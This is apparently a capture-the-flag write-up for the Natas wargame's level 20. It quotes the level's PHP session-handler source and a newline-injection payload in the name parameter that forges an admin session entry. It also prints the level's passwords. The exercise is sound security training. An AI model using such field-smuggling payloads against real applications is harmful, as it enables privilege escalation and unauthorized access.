# Natas Level 20

> Username: natas20

> Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao

> URL: http://natas20.natas.labs.overthewire.org

## Solution

Entering the URL, we found that we are already login as a regular user `You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.` And we can only change the name. So let's read the source code to find the vulnerability.

```php
<?php
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}
?>
```

To get the password for Natas21, the application needs this: `$_SESSION["admin"] = 1;`
But you cannot directly set `admin` through the normal form. The application only lets you change your name.

But the real vulnerability here is how sessions are saved:

```php
foreach($_SESSION as $key => $value) {
    $data .= "$key $value\n";
}
```

Normally, PHP sessions use a special serialization format. But here the developer create format with `key value`. Here you could thing what would happen if you enter a name separate with a `new line (\n)` and then enter another value. It should looks like this:

```text
anyname
admin 1
```

The application thinks it's saving one name, but the resulting file looks like two separate session variables.

So this is the payload `anyname%0Aadmin%201`, the URL must be like:

```text
http://natas20.natas.labs.overthewire.org/?name=name%0Aadmin%201
```

```text
You are an admin. The credentials for the next level are:
Username: natas21
Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```

```text
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```

